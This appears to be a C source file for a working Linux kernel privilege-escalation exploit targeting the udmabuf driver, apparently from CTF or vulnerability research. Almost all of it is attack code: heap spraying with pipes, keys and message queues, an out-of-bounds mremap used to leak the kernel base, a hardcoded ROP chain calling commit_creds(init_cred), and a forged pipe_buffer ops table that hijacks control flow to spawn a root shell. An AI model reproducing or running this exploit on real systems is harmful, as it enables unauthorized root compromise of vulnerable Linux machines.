#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <sched.h>
#include <sys/types.h>

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    asm volatile (
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

void get_root_shell(){
    printf("now pid == %p\n", getpid());
    system("/bin/sh");
}

//CPU绑核
void bindCore(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("\033[34m\033[1m[*] Process binded to core \033[0m%d\n", core);
}

#define UDMABUF_CREATE _IOW('u', 0x42, struct udmabuf_create)
#include <sys/mman.h>
#include <sys/syscall.h>
#include "pg_vec.h"
#include "page.h"


struct udmabuf_create
{
  uint32_t memfd;
  uint32_t flags;
  uint64_t offset;
  uint64_t size;
};

#include "key.h"
int kids[0x100];
void spray_key(int times, int len, char *con){
    char des[0x100];
    memset(des, 0, sizeof(des));
    char pay[0x100];
    memset(pay, 0, sizeof(pay));
    for(int i = 0; i < times; i++){
        memset(des, 'A'+i, 0xa0);
        memset(pay, 'a'+i, len);
        memcpy(pay, con, len);
        kids[i] = key_alloc(des, pay, len);
        printf("kid == %d\n", kids[i]);
    }
}
int pipe1[0x200][2];
void spray_pipe(int times, int start){
    for(int i = 0; i < times; i++){
      if(pipe(pipe1[start+i]) < 0){
        perror("create pipe");
        exit(-1);
      }
      //printf("pipe_fd --> %d, %d\n", pipe1[start+i][0], pipe1[start+i][1]);
    }
}

#define TOTAL_PAGES 0x200
size_t data[0x1000];
#define FIRST_NUM 0x80
#define SECOND_NUM 0x200

#include "msg.h"
void spray_msg(char *con){
    int kmsg_idx;
    int ms_qid[0x100];
   	char msg_buf[0x2000];
    for (int i = 0; i < 0x30; i++)
    {
        ms_qid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
        if (ms_qid[i] < 0)
        {
            puts("[x] msgget!");
            return -1;
        }
    }
    
    for (int i = 0; i < 0x30; i++)
    {
        memset(msg_buf, 'A', 0x1800 - 8);
        int ret = msgsnd(ms_qid[i], con, 0x1800 - 0x30-0x8, 0);
        if (ret < 0)
        {
            puts("[x] msgsnd!");
            return -1;
        }
    }


}

size_t kbase ;
int pipe_fd;
size_t add_rsp_0xb8_pop2;
size_t pop_rbp_ret;
size_t leave_ret;
size_t fake_stack;

int main(){
    
    save_status();
    bindCore(0);

    unshare_setup();
    page_init();

    int mem_fd = memfd_create("test", MFD_ALLOW_SEALING);
  if (mem_fd < 0)
    errx(1, "couldn't create anonymous file");
  
  /* setup size of anonymous file, the initial size was 0 */
  if (ftruncate(mem_fd,0x1000 * FIRST_NUM) < 0)
    errx(1, "couldn't truncate file length");

  /* make sure the file cannot be reduced in size */
  if (fcntl(mem_fd, F_ADD_SEALS, F_SEAL_SHRINK) < 0)
    errx(1, "couldn't seal file");

  printf("[*] anon file fd=%d (%#x bytes)\n", mem_fd, 0x1000 * FIRST_NUM);


    int dev_fd = open("/dev/udmabuf", O_RDWR);
    if (dev_fd < 0)
        errx(1, "couldn't open device");

    printf("[*] udmabuf device fd=%d\n", dev_fd);

     struct udmabuf_create create = { 0 };
    create.memfd = mem_fd;
    create.size  = 0x1000 * FIRST_NUM;
    
    /* reallocate one of the freed holes in kmalloc-1024 */
    int udmabuf_fd = ioctl(dev_fd, UDMABUF_CREATE, &create);
    if (udmabuf_fd < 0)
      errx(1, "couldn't create udmabuf");

    printf("[*] udmabuf fd=%d\n", udmabuf_fd);

    spray_pipe(0x100, 0x0);
    memset(data, 'a', 0x1000);
    for(int i = 0; i < 0x100; i++) {
        write(pipe1[i][1], data, 0x1000);
        write(pipe1[i][1], &i, 0x4);
    }
    puts("spray pipe done");

    void* udmabuf_map = mmap(NULL, 0x1000 * FIRST_NUM,
        PROT_READ|PROT_WRITE, MAP_SHARED, udmabuf_fd, 0);
    if (udmabuf_map == MAP_FAILED)
      errx(1, "couldn't map udmabuf");

    printf("[*] udmabuf mapped at %p (%#x bytes)\n", 
        udmabuf_map, 0x1000 * FIRST_NUM);

    /* remap the virtual mapping expanding its size */
    void* new_udmabuf_map = mremap(udmabuf_map,
        0x1000 * 8, 0x1000 * SECOND_NUM, MREMAP_MAYMOVE);
    if (new_udmabuf_map == MAP_FAILED)
      errx(1, "couldn't remap udmabuf mapping");

    printf("[*] udmabuf map expanded at %p (%#x bytes)\n", new_udmabuf_map,
        0x1000 * SECOND_NUM);
    
    int victim_idx = -1;
    memcpy(&victim_idx, new_udmabuf_map+FIRST_NUM*0x1000+0x5000, 4);
    printf("victim_idx == %d\n", victim_idx);
    
    int vic2 = -1;
    memcpy(&vic2, new_udmabuf_map+FIRST_NUM*2*0x1000+0x5000, 4);
    printf("vic2 == %d\n", vic2);
    if(victim_idx == -1 || vic2 == -1) exit(0);

    //read(pipe1[victim_idx][0], data, 4);
    close(pipe1[victim_idx][0]);
    close(pipe1[victim_idx][1]);
    puts("sleep for 2 second ...");
    sleep(2);

    for(int i = 0; i < 0x100; i++){
        if(i == victim_idx) continue;
        if(i == vic2) continue;
        if(fcntl(pipe1[i][1], F_SETPIPE_SZ, 0x1000 * 4 ) < 0){
            printf("%d--%d\n", i, pipe1[i][1]);
            perror("set pipe size error!");
            exit(-1);
        }

    }

    memcpy(data, new_udmabuf_map+FIRST_NUM*0x1000, 0x1000);
    for(int i = 0; i < 0x200; i++){
      //printf("data -> %p\n", (void *)data[i]);
    }
    size_t page_struct = data[0];
    kbase = data[2] - 0xffffffff82019a40;
    printf("kbase == %p\n", (void *)kbase);
    add_rsp_0xb8_pop2 = kbase + 0xffffffff81078d6b;



    close(pipe1[vic2][0]);
    close(pipe1[vic2][1]);
    puts("sleep for 2 second ...");
    sleep(2);

    leave_ret = kbase + 0xffffffff8107bd3c;
    pop_rbp_ret = kbase + 0xffffffff81000688;
    size_t init_cred = kbase + 0xffffffff8244c6c0;
    size_t pop_rdi_ret = kbase + 0xffffffff81422e9c;
    size_t commit_creds = kbase + 0xffffffff8108a190;
    size_t ret = kbase + 0xffffffff81422e9d;
    size_t kpti = kbase + 0xffffffff81c00e06;

    int k = 0;
    //构造fake_ops
    memset(data, 'a', sizeof(data));
    data[k++] = 0x1234567812345678;
    data[k++] = add_rsp_0xb8_pop2;
    data[k++] = add_rsp_0xb8_pop2;
    data[k++] = add_rsp_0xb8_pop2;
    data[k++] = ret;
    data[k++] = ret;
    data[k++] = pop_rdi_ret;
    data[k++] = init_cred;
    data[k++] = commit_creds;
    data[k++] = kpti;
    data[k++] = 0LL;
    data[k++] = 0LL;
    data[k++] = get_root_shell;
    data[k++] = user_cs;
    data[k++] = user_rflags;
    data[k++] = user_sp;
    data[k++] = user_ss;
    //构造fake_stack

    spray_msg(data);

    memcpy(data, new_udmabuf_map+FIRST_NUM*2*0x1000, 0x1000);
    size_t fake_ops = -1;
    for(int i = 0; i < 0x200; i++){
      //printf("data -> %p\n", (void *)data[i]);
      if(data[i] >= 0xffff888000000000 && data[i] % 0x1000 == 0){
        fake_ops = data[i] + 0x30;
        break;
      }
    }
    printf("fake_ops == %p\n", (void *)fake_ops);

    char *pipe_buffer = new_udmabuf_map+FIRST_NUM*0x1000;
    data[0] = page_struct;
    data[1] = 0x100000000000;
    data[2] = fake_ops;
    memcpy(pipe_buffer, data, 0x18);

    fake_stack = fake_ops + 0x20;
    printf("fake_stack == %p\n", (void *)fake_stack);

    for(int i = 0; i < 0x100; i++){
        if(i == victim_idx) continue;
        if(i == vic2) continue;
        pipe_fd = pipe1[i][0];
        __asm__(
            "mov rdi, pipe_fd;"
            "mov rsi, 0;"
            "mov rdx, 8;"
            "mov r15, pop_rbp_ret;"
            "mov r14, fake_stack;"
            "mov r13, leave_ret;"
            "mov r12, 0xcccccccc;"
            "mov r11, 0xbbbbbbbb;"
            "mov r10, 0xaaaaaaaaa;"
            "mov r9,  0x99999999;"
            "mov rax, 3;"
            "syscall;"

        );
        pipe_fd = pipe1[i][1];
        __asm__(
            "mov rdi, pipe_fd;"
            "mov rsi, 0;"
            "mov rdx, 8;"
            "mov r15, pop_rbp_ret;"
            "mov r14, fake_stack;"
            "mov r13, leave_ret;"
            "mov r12, 0xcccccccc;"
            "mov r11, 0xbbbbbbbb;"
            "mov r10, 0xaaaaaaaaa;"
            "mov r9,  0x99999999;"
            "mov rax, 3;"
            "syscall;"

        );
    }

    puts("end");
    getchar();
}